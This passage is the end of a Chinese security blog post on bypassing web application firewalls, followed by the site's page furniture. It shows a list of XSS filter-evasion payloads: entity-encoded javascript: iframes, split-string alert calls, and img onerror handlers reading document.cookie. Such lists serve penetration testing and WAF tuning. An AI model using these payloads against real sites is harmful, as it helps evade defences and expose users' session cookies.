+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token entity" title="&#106;">&amp;#106;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#118;">&amp;#118;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#115;">&amp;#115;</span><span class="token entity" title="&#99;">&amp;#99;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#105;">&amp;#105;</span><span class="token entity" title="&#112;">&amp;#112;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#58;">&amp;#58;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#108;">&amp;#108;</span><span class="token entity" title="&#101;">&amp;#101;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#40;">&amp;#40;</span><span class="token entity" title="&#49;">&amp;#49;</span><span class="token entity" title="&#50;">&amp;#50;</span><span class="token entity" title="&#51;">&amp;#51;</span><span class="token entity" title="&#41;">&amp;#41;</span></span><span class="token punctuation">></span></span>
+
+"&#125;;top['ale'+'rt'](1);&#123;//aaa"
+
+onmouseenter=top["ale"+"rt"](1) a'
+
+\u201c\u003e\u003cimg
+
+src=1 onerror=alert(document.cookie)\u003e
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
+
+    
+\判断伪静态\
+
+javascript:alert(document.lastModified)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</body>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://egstar.top">Egstar</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://egstar.top/post/56f57219.html">http://egstar.top/post/56f57219.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://egstar.top" target="_blank">Egstar站长</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WAF/">WAF</a></div><div class="post_share"><div class="social-share" data-image="/images/250225_1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/da6acaa9.html" title="《增广贤文》原文赏析"><img class="cover" src="/images/250220.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">《增广贤文》原文赏析</div></div></a></div><div class="next-post pull-right"><a href="/post/cec152a6.html" title="等保2.0"><img class="cover" src="/images/250306.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">等保2.0</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/pkds.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Egstar</div><div class="author-info__description">安全秘辛，古文经典</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Egstar1"><i class="fab fa-github"></i><span>我的Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Egstar1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1337995241@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">文件上传绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">1.1.</span> <span class="toc-text">修改特殊文件名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">截断绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E7%AD%89%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">多等号绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AAfilename%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.</span> <span class="toc-text">多个filename绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E5%BC%95%E5%8F%B7%EF%BC%88%E5%B8%B8%E8%A7%81%E6%9C%89%E6%95%88%EF%BC%89"><span class="toc-number">1.5.</span> <span class="toc-text">删除引号（常见有效）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.</span> <span class="toc-text">换行绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE%E5%A1%AB%E5%85%85%EF%BC%88%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E7%A8%8B%E5%BA%8F%E5%BC%82%E5%B8%B8%EF%BC%89"><span class="toc-number">1.7.</span> <span class="toc-text">垃圾数据填充（可能导致程序异常）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E6%BA%A2%E5%87%BA"><span class="toc-number">1.8.</span> <span class="toc-text">文件名溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-Type-%E7%BB%95%E8%BF%87"><span class="toc-number">1.9.</span> <span class="toc-text">Content-Type 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8DURL%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.</span> <span class="toc-text">文件名URL编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E5%A4%B4-%E5%86%85%E5%AE%B9%E7%BB%95%E8%BF%87"><span class="toc-number">1.11.</span> <span class="toc-text">魔术头&#x2F;内容绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">JNDI注入绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">3.</span> <span class="toc-text">SQL注入绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">XSS绕过</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/3f9d8036.html" title="ShellCode免杀平台-EasyTools">ShellCode免杀平台-EasyTools</a><time datetime="2025-05-28T09:20:43.000Z" title="发表于 2025-05-28 17:20:43">2025-05-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/cec152a6.html" title="等保2.0"><img src="/images/250306.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="等保2.0"/></a><div class="content"><a class="title" href="/post/cec152a6.html" title="等保2.0">等保2.0</a><time datetime="2025-03-06T02:09:42.000Z" title="发表于 2025-03-06 10:09:42">2025-03-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/56f57219.html" title="WAF防护绕过"><img src="/images/250225_1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="WAF防护绕过"/></a><div class="content"><a class="title" href="/post/56f57219.html" title="WAF防护绕过">WAF防护绕过</a><time datetime="2025-02-25T01:28:55.000Z" title="发表于 2025-02-25 09:28:55">2025-02-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/da6acaa9.html" title="《增广贤文》原文赏析"><img src="/images/250220.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《增广贤文》原文赏析"/></a><div class="content"><a class="title" href="/post/da6acaa9.html" title="《增广贤文》原文赏析">《增广贤文》原文赏析</a><time datetime="2025-02-20T08:48:22.000Z" title="发表于 2025-02-20 16:48:22">2025-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d9476fae.html" title="网络安全岗位面试"><img src="/images/250124.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网络安全岗位面试"/></a><div class="content"><a class="title" href="/post/d9476fae.html" title="网络安全岗位面试">网络安全岗位面试</a><time datetime="2025-01-24T03:54:22.000Z" title="发表于 2025-01-24 11:54:22">2025-01-24</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2025 By Egstar</div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.<p><a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速"></a> &nbsp;<a target="_blank" href="https://vercel.com/ "><img src="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel"></a>&nbsp;<a target="_blank" href="https://vercel.com/ "><img src="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站采用双线部署，联通线路托管于Coding"></a>&nbsp;<a target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo.egstar.top/',
+      region: 'ap-shanghai',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.egstar.top/',
+      region: 'ap-shanghai',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script src="/statics/mouse_hover.js"></script><script src="/statics/chocolate.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script data-pjax defer src="https://npm.elemecdn.com/tzy-blog/lib/js/theme/chocolate.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
